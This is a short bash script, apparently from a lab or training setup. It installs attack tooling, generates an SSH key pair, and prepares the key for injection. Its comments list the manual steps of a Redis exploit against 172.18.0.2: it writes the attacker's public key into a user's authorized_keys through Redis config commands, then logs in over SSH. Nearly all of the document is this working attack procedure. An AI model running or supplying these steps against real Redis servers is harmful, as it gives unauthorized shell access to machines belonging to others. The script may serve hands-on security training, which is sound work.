#!/bin/bash

echo "Installing dependencies..."
#
sudo apt update -y
sudo apt install build-essential -y
sudo apt install curl -y
sudo apt-get -y install net-tools
sudo apt-get install -y iputils-ping
sudo apt-get -y install software-properties-common
sudo apt install -y less
sudo apt install -y unzip
sudo apt install -y nano
sudo apt install -y rsyslog
sudo service rsyslog start
sudo apt install iproute2 -y
sudo apt -y install make gcc
sudo apt install redis -y
sudo apt install nmap -y

cd ~
mkdir .ssh
ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
cd .ssh
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt

# IP is target IP
# ----------Redis exploit Steps that cannot be automated---------
# cd ~/.ssh
# cat 1.txt | redis-cli -h 172.18.0.2 -x set sshkey
# redis-cli -h 172.18.0.2
# keys *
# config set dir /home/resch/.ssh
# config set dbfilename "authorized_keys"
# save
# exit
# ssh -i ./id_rsa resch@172.18.0.2
#------------------------------------------------------------------